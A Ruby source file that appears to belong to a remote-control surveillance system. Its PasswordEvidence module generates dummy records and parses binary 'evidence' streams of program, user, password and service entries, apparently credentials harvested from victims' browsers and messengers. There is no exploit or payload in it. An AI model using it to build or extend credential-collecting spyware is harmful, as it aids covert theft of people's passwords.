require 'rcs-common/evidence/common'

module RCS

module PasswordEvidence

  ELEM_DELIMITER = 0xABADC0DE

  def content
    resource = ["MSN", "IExplorer", "Firefox"].sample.to_utf16le_binary_null
    service = ["http://login.live.com", "http://www.google.com", "http://msn.live.it"].sample.to_utf16le_binary_null
    user = ["ALoR", "test", "daniel", "naga"].sample.to_utf16le_binary_null
    pass = ["secret", "mario1", "ht123456"].sample.to_utf16le_binary_null
    content = StringIO.new
    content.write resource
    content.write user
    content.write pass
    content.write service
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
  
  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    info = Hash[common_info]
    until stream.eof?
      info[:data][:program] = ''
      info[:data][:service] = ''
      info[:data][:user] = ''
      info[:data][:pass] = ''

      resource = stream.read_utf16le_string
      info[:data][:program] = resource.utf16le_to_utf8 unless resource.nil?
      user = stream.read_utf16le_string
      info[:data][:user] = user.utf16le_to_utf8 unless user.nil?
      pass = stream.read_utf16le_string
      info[:data][:pass] = pass.utf16le_to_utf8 unless pass.nil?
      service = stream.read_utf16le_string
      info[:data][:service] = service.utf16le_to_utf8 unless service.nil?

      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed PASSWORD (missing delimiter)") unless delim == ELEM_DELIMITER

      # this is not the real clone! redefined clone ...
      yield info if block_given?
    end
  end
end

end # ::RCS
